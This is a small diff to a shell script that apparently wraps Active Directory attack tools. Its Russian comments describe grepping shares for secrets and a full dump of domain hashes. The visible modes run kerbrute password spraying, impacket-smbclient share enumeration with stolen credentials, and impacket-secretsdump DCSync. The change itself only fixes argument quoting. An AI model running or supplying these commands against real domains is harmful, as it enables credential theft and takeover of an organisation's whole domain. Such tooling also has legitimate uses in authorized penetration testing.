@@ -20,10 +20,10 @@ case "$MODE" in
     kerbrute passwordspray -dc "$DC" -d "$DOMAIN" "$1" "$2"
     ;;
   shares)  # шары под кредами + grep на секреты
-    impacket-smbclient "$DOMAIN/$1"@"$DC" -c 'shares'
+    impacket-smbclient "$DOMAIN/$1@$DC" -c 'shares'
     ;;
   dcsync)  # полный дамп хэшей домена
-    impacket-secretsdump "$DOMAIN/$1"@"$DC"
+    impacket-secretsdump "$DOMAIN/$1@$DC"
     ;;
   *) echo "mode: users|asrep|spray|shares|dcsync" >&2; exit 1 ;;
 esac
